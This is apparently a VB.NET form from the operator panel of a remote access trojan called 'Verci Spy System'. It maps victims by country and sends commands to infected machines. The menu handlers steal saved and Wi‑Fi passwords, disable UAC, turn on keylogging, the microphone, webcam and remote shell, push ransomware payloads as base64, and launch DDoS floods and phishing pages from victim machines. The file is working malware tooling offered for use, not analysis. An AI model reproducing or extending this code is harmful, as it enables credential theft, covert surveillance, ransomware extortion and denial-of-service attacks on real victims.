Imports System.IO

Public Class gadget
    Dim currH As Double = 10.0
    Dim hackerx, hackery As Single
    Public Yy As String = "|BlueEagle|"
    Private Sub gadget_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load
        Me.TransparencyKey = Color.White
        Me.Left = My.Computer.Screen.WorkingArea.Width - Me.Width
        Timer1.Start()



    End Sub
    Private Sub Timer2x()
        Timer2.Start()
    End Sub
    Private Sub Label2_Click(sender As System.Object, e As System.EventArgs) Handles Label2.Click
        Main.WindowState = FormWindowState.Normal
        Main.StartPosition = FormStartPosition.CenterScreen
        Me.Close()
    End Sub

    Private Sub Timer1_Tick(sender As System.Object, e As System.EventArgs) Handles Timer1.Tick
        '274; 46 small
        '274; 428 normal
        If currH < 490 Then
            currH += 49.1
            Me.Size = New Size(274, currH)
            Me.Refresh()
        Else
            Timer1.Stop()
            SpeakThread("Welcome to Verci Gadget")
            Button1.PerformClick()
            Flager.Start()
            Exit Sub
        End If
    End Sub

    Public Sub DrawLineFloatServer(ByVal startpoint As Point, ByVal endpoint As Point)
        ' Create pen.


        Dim blackPen As New Pen(Color.Yellow, 1)
        ' Create coordinates of points that define line. 
        Dim x1 As Single = startpoint.X
        Dim y1 As Single = startpoint.Y
        Dim x2 As Single = endpoint.X
        Dim y2 As Single = endpoint.Y
        ' Draw line to screen. 

        Dim g As Graphics = PictureBox2.CreateGraphics()
        g.DrawLine(blackPen, x1, y1, x2, y2)
        ' Dim myfont As New Font("Sans Serif", 12, FontStyle.Italic)
        '  g.DrawString("  Virtual Server", myfont, Brushes.Yellow, x2, y2)
        ' g.DrawString("  Your Virtual Country", myfont, Brushes.Violet, x1, y1)
        blackPen.Dispose()

    End Sub

    Private Sub Flager_Tick(sender As System.Object, e As System.EventArgs) Handles Flager.Tick
        On Error Resume Next

        DrawLineFloatServer(Main.getstartpoint(Main.ratcountryx, Main.ratcountryy), Main.getendpoint(Main.serverx, Main.servery))
        hackercoord(Main.ratcountry)

        If Main.L1.Items.Count > 0 Then
            For Each victim As ListViewItem In Main.L1.Items

                Dim city As String = victim.SubItems(4).Text
                MapPlotter(city)
            Next
        End If
        MapPlotter(Main.ratcountry)
    End Sub
    Sub MapPlotter(ByVal country As String)
        cord_getter(country)
    End Sub
    Sub cord_getter(ByVal City As String)
        On Error Resume Next
        Dim x As String = ""
        Dim database As New RichTextBox
        database.Text = My.Resources.countryinfo
        For Each line In database.Lines
            If line.Contains(City) Then
                x = line.Replace(City & "|", "")
                Dim coords() As String = x.Split(",")
                '      mapcoords(coords(0), coords(1))
                Main.country = City
                pic2(coords(0), coords(1))
            End If
        Next
    End Sub
    Sub pic2(ByVal latitude As Double, ByVal longitude As Double)

        Dim pbwidth As Double = PictureBox2.Width
        Dim pbheight As Double = PictureBox2.Height
        Dim longratio As Double = pbwidth / 360
        Dim latratio As Double = pbheight / 180
        Dim latcord As Double = 90 - latitude
        Dim longcord As Double = (180 + longitude)
        latcord = latratio * latcord
        longcord = longratio * longcord
        Dim g As Graphics = PictureBox2.CreateGraphics
        Dim flag As Image = ImageList1.Images(GetCountryNumber(UCase(Main.country)))
        g.DrawImage(flag, CInt(longcord - flag.Width / 2), CInt(latcord - flag.Height / 2), 8, 8)


        If Main.havepoints = True Then

            ' DrawLineFloat(Main.getstartpoint(Main.startxpoint, Main.startypoint), Main.getendpoint(CInt(longcord) - 1, CInt(latcord) - 1))

        End If
        Flager.Start()
    End Sub
    Sub hackercoord(ByVal City As String)
        On Error Resume Next
        Dim x As String = ""
        Dim database As New RichTextBox
        database.Text = My.Resources.countryinfo
        For Each line In database.Lines
            If line.Contains(City) Then
                x = line.Replace(City & "|", "")
                Dim coords() As String = x.Split(",")
                '      mapcoords(coords(0), coords(1))
                Main.country = City
                pic2(coords(0), coords(1))
                hackerpic(coords(0), coords(1))
            End If
        Next
    End Sub
    Sub hackerpic(ByVal latitude As Double, ByVal longitude As Double)
        Dim pbwidth As Double = PictureBox2.Width
        Dim pbheight As Double = PictureBox2.Height
        Dim longratio As Double = pbwidth / 360
        Dim latratio As Double = pbheight / 180
        Dim latcord As Double = 90 - latitude
        Dim longcord As Double = (180 + longitude)
        latcord = latratio * latcord
        longcord = longratio * longcord
        Dim g As Graphics = PictureBox2.CreateGraphics
        Dim flag As Image = My.Resources.Icons_Land_Vista_Hardware_Devices_Home_Server.ToBitmap
        hackerx = CInt(longcord - flag.Width / 2)
        hackery = CInt(latcord - flag.Height / 2)

        g.DrawImage(flag, CInt(longcord - flag.Width / 2), CInt(latcord - flag.Height / 2), 8, 8)
    End Sub
    Public Sub DrawLineFloat(ByVal startpoint As Point, ByVal endpoint As Point)
        ' Create pen. 
        Dim blackPen As New Pen(Color.Lime, 1)
        ' Create coordinates of points that define line. 
        Dim x1 As Single = startpoint.X
        Dim y1 As Single = startpoint.Y
        Dim x2 As Single = endpoint.X
        Dim y2 As Single = endpoint.Y
        ' Draw line to screen. 

        Dim g As Graphics = PictureBox2.CreateGraphics()
        g.DrawLine(blackPen, x1, y1, x2, y2)

        blackPen.Dispose()

    End Sub
#Region "Drag"

    Dim posX As Integer
    Dim posY As Integer
    Dim drag As Boolean



    Private Sub Header_MouseDown(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Label1.MouseDown, Label2.MouseDown
        If e.Button = MouseButtons.Left Then
            drag = True
            posX = Cursor.Position.X - Me.Left
            posY = Cursor.Position.Y - Me.Top
        End If
    End Sub

    Private Sub Header_MouseUp(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Label1.MouseUp, Label2.MouseUp
        drag = False
    End Sub

    Private Sub Header_MouseMove(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Label1.MouseMove, Label2.MouseMove
        If drag Then
            Me.Top = Cursor.Position.Y - posY
            Me.Left = Cursor.Position.X - posX
        End If
        Me.Cursor = Cursors.Default
    End Sub





#End Region
    Private Sub PictureBox2_Click(sender As System.Object, e As System.EventArgs) Handles PictureBox2.Click
        On Error Resume Next
        Dim rect As Rectangle = Main.PictureBox2.ClientRectangle
        Dim bmp As New Bitmap(rect.Width, rect.Height)
        Main.PictureBox2.DrawToBitmap(bmp, rect)
        PictureBox2.Image = bmp
    End Sub


    Private Sub StealSavedPasswordToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles StealSavedPasswordToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            Main.S.Send(x.ToolTipText, "passwords")
        Next
    End Sub



    Private Sub EnableUACToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles EnableUACToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            Main.S.Send(x.ToolTipText, "UACon")
        Next
    End Sub
    '  SpeakThread("Preparing Remote Registry Editor")
    Private Sub DisableUACToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles DisableUACToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            Main.S.Send(x.ToolTipText, "UACoff")
        Next
    End Sub

    Private Sub RemoteDesktopToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RemoteDesktopToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            Main.S.Send(x.ToolTipText, "!")

        Next
    End Sub

    Private Sub MicrophoneToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles MicrophoneToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            Main.S.Send(x.ToolTipText, "Mic")

        Next
    End Sub

    Private Sub FileManagerToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles FileManagerToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            Main.S.Send(x.ToolTipText, "\\")

        Next
    End Sub

    Private Sub RemoteClipboardToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RemoteClipboardToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            Main.S.Send(x.ToolTipText, "clipss")
        Next
    End Sub

    Private Sub ProcessManagerToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles ProcessManagerToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            Main.S.Send(x.ToolTipText, "OpenPro")

        Next
    End Sub

    Private Sub RemoteDeviceViewerToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RemoteDeviceViewerToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            Main.S.Send(x.ToolTipText, "devicesinfo")
        Next
    End Sub

    Private Sub RemoteRegeditorToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RemoteRegeditorToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            Main.S.Send(x.ToolTipText, "openRG")
        Next
    End Sub

    Private Sub RemoteToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RemoteToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            Main.S.Send(x.ToolTipText, "ssopen")

        Next
    End Sub

    Private Sub ViewWifiRoutersToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles ViewWifiRoutersToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            Main.S.Send(x.ToolTipText, "viewwifi")
        Next
    End Sub

    Private Sub OpenHotspotToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles OpenHotspotToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            Main.S.Send(x.ToolTipText, "hotspot")
        Next
    End Sub

    Private Sub ShareClientDrivesOverLanToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles ShareClientDrivesOverLanToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            Main.S.Send(x.ToolTipText, "share")
        Next
    End Sub

    Private Sub RemoteLanManagmentToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RemoteLanManagmentToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            Main.LanCurrentVictim = L1.SelectedItems(0).SubItems(2).Text
            Main.S.Send(x.ToolTipText, "viewlan")

        Next
    End Sub

    Private Sub RemoteConnectionsToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RemoteConnectionsToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            Main.S.Send(x.ToolTipText, "stat")
        Next
        Main.AdpaterTurn = False
        Main.StatTurn = True
    End Sub

    Private Sub ManageNetworkCardToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles ManageNetworkCardToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            Main.S.Send(x.ToolTipText, "stat")
        Next
        Main.AdpaterTurn = True
        Main.StatTurn = False
    End Sub

    Private Sub RemoteInstalledProgramsToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RemoteInstalledProgramsToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            Main.S.Send(x.ToolTipText, "pro")

        Next
    End Sub

    Private Sub OpenChatToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles OpenChatToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            Main.S.Send(x.ToolTipText, "openchat")
        Next
    End Sub

    Private Sub RemoteCodeCompilerToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RemoteCodeCompilerToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            Main.S.Send(x.ToolTipText, "code")

        Next
    End Sub

    Private Sub CyberSplitterRansomwareToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles CyberSplitterRansomwareToolStripMenuItem.Click
        Dim ransompath As String = Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & "vbsransom[Don`t_Run].exe"


        For Each x As ListViewItem In L1.SelectedItems
            Main.S.Send(x.ToolTipText, "ransom" & Yy & "ransom.exe" & Yy & Convert.ToBase64String(IO.File.ReadAllBytes(ransompath)))

        Next
    End Sub

    Private Sub SaherBlueEagleToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles SaherBlueEagleToolStripMenuItem.Click
        Dim ransompath As String = Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & "sblransom[Don`t_Run].exe"


        For Each x As ListViewItem In L1.SelectedItems
            Main.S.Send(x.ToolTipText, "ransom" & Yy & "ransom.exe" & Yy & Convert.ToBase64String(IO.File.ReadAllBytes(ransompath)))

        Next
    End Sub

    Private Sub UploadYourRansomToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles UploadYourRansomToolStripMenuItem.Click
        'run from disk 
        On Error Resume Next
        Dim o As New OpenFileDialog
        o.ShowDialog()
        Dim n As New IO.FileInfo(o.FileName)
        If o.FileName.Length > 0 Then
            For Each x As ListViewItem In L1.SelectedItems
                Main.S.Send(x.ToolTipText, "sendfile" & Yy & n.Name & Yy & Convert.ToBase64String(IO.File.ReadAllBytes(o.FileName)))
            Next
        End If
    End Sub

    Private Sub RemoteKeylogsToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RemoteKeylogsToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            Main.S.Send(x.ToolTipText, "openkl")
        Next
    End Sub

    Private Sub ClientPCFullInformationToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles ClientPCFullInformationToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems

            Main.S.Send(x.ToolTipText, "sendinformation")
        Next
    End Sub

    Private Sub FromDiskToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles FromDiskToolStripMenuItem.Click
        'run from disk 
        On Error Resume Next
        Dim o As New OpenFileDialog
        o.ShowDialog()
        Dim n As New IO.FileInfo(o.FileName)
        If o.FileName.Length > 0 Then
            For Each x As ListViewItem In L1.SelectedItems
                Main.S.Send(x.ToolTipText, "sendfile" & Yy & n.Name & Yy & Convert.ToBase64String(IO.File.ReadAllBytes(o.FileName)))
            Next
        End If
    End Sub

    Private Sub DirectLinkToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles DirectLinkToolStripMenuItem.Click
        Dim a As String = InputBox("Enter Direct URL", "Download")
        Dim aa As String = InputBox("Enter the name of the file", "Download")
        For Each x As ListViewItem In L1.SelectedItems
            Main.S.Send(x.ToolTipText, "download" & Yy & a & Yy & aa)
        Next
    End Sub

    Private Sub OpenURLToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles OpenURLToolStripMenuItem.Click
        Dim c As String = InputBox("Enter Website")
        For Each x As ListViewItem In L1.SelectedItems
            x.Text = c
            Main.S.Send(x.ToolTipText, "openurl" & Yy & "Default" & Yy & c)
        Next
    End Sub

    Private Sub ShutdownToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles ShutdownToolStripMenuItem.Click


        For Each x As ListViewItem In L1.SelectedItems
            Main.S.Send(x.ToolTipText, "Uninstall")
        Next

    End Sub

    Private Sub RestartToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RestartToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            Main.S.Send(x.ToolTipText, "restart")
        Next
    End Sub

    Private Sub RenameToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RenameToolStripMenuItem.Click
        Dim b As String = InputBox("Enter New Backdoor Name")
        For Each x As ListViewItem In L1.SelectedItems
            x.Text = b
            Main.S.Send(x.ToolTipText, "rename" & Yy & b)
        Next
    End Sub

    Private Sub FullUninstallToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles FullUninstallToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            Main.S.Send(x.ToolTipText, "FullUninstall")
        Next
    End Sub

    Private Sub CmdPingToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles CmdPingToolStripMenuItem.Click
        Dim str1 As String = Interaction.InputBox("IP / Web site :", "DDos Attacker", "", -1, -1)
        Dim str2 As String = Interaction.InputBox("Attack Speed", "8000 or 10000 or 12000 or 15000", "", -1, -1)
        Try
            For Each x As ListViewItem In L1.SelectedItems
                Main.S.Send(x.ToolTipText, "ddos" & Yy & str1 & Yy & str2)
            Next
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub HttpFlooderToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles HttpFlooderToolStripMenuItem.Click
        Try
            For Each x As ListViewItem In L1.SelectedItems
                Main.S.Send(x.ToolTipText, "FLOOD")
            Next
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub
    Private Sub WebcamToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles WebcamToolStripMenuItem.Click
        Main.MACAMEX()
    End Sub


    Private Sub WifiSavedProfilesToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles WifiSavedProfilesToolStripMenuItem.Click
        File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & "wifi.exe", My.Resources.WifiGrabber)

        For Each x As ListViewItem In L1.SelectedItems
            Main.S.Send(x.ToolTipText, "wifipass")
        Next
        ExexuteWifi()
    End Sub
    Private Sub ExexuteWifi()
        Dim wifipath As String = Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & "wifi.exe"


        For Each x As ListViewItem In L1.SelectedItems
            Main.S.Send(x.ToolTipText, "wifiexe" & Yy & "wifi.exe" & Yy & Convert.ToBase64String(IO.File.ReadAllBytes(wifipath)))

        Next
        IO.File.Delete(wifipath)
    End Sub
    Private Sub RemoteCommandPromptToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RemoteCommandPromptToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            Main.S.Send(x.ToolTipText, "rss")
        Next
    End Sub

    Private Sub PacketSnifferToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles PacketSnifferToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            Main.S.Send(x.ToolTipText, "rss")
        Next
    End Sub

    Private Sub SqlmapToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles SqlmapToolStripMenuItem.Click

        For Each x As ListViewItem In L1.SelectedItems
            Main.S.Send(x.ToolTipText, "sqlrss")
        Next
    End Sub

    Private Sub VisaSimulatorToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles VisaSimulatorToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            Main.S.Send(x.ToolTipText, "visa")
        Next
    End Sub

    Private Sub ScamSimulatorhtmlToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles ScamSimulatorhtmlToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            Main.S.Send(x.ToolTipText, "scam")
        Next
    End Sub

    Private Sub FacebookSimulatorhtmlToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles FacebookSimulatorhtmlToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            Main.S.Send(x.ToolTipText, "facebook")
        Next
    End Sub
    Private Sub refreshmain()
        ' l1.Items.Clear()





        Dim i As Integer = 0
        For Each computer In Main.L1.Items
            L1.Items(i).Text = Main.L1.Items(i).Text
            L1.Items(i).ToolTipText = Main.L1.Items(i).ToolTipText
            i += 1
        Next

    End Sub
    Private Sub refreshmain2()
        For i As Integer = 0 To Main.L1.Items.Count - 1

            L1.Items.Add(Main.L1.Items(i).Text, Main.ReturnIndexLan(Main.L1.Items(i).SubItems(3).Text))
            L1.Items(i).SubItems.Add(Main.L1.Items(i).SubItems(1).Text)
            L1.Items(i).SubItems.Add(Main.L1.Items(i).SubItems(2).Text)

            L1.Items(i).ToolTipText = Main.L1.Items(i).ToolTipText


            Next
    End Sub

    '   Main.ReturnIndex()
    Private Sub Timer2_Tick(sender As System.Object, e As System.EventArgs) Handles Timer2.Tick
        On Error Resume Next
        L1.Items.Clear()
        refreshmain2()
    End Sub

    Private Sub Button1_Click(sender As System.Object, e As System.EventArgs) Handles Button1.Click
        Timer2.Start()
    End Sub

    Private Sub L1_SelectedIndexChanged(sender As System.Object, e As System.EventArgs) Handles L1.SelectedIndexChanged

        If L1.SelectedItems.Count = 0 Then
            Timer2.Start()
        ElseIf L1.SelectedItems.Count = 1 Then

            Timer2.Stop()

        End If
    End Sub

    Private Sub Button15_Click(sender As System.Object, e As System.EventArgs) Handles Button15.Click
        Dim result As Integer = MessageBox.Show("Are you sure to exit ?", "Verci Spy System", MessageBoxButtons.YesNo, MessageBoxIcon.Question)
        If result = DialogResult.No Then
            Exit Sub
        ElseIf result = DialogResult.Yes Then
            End
        End If
    End Sub

    
End Class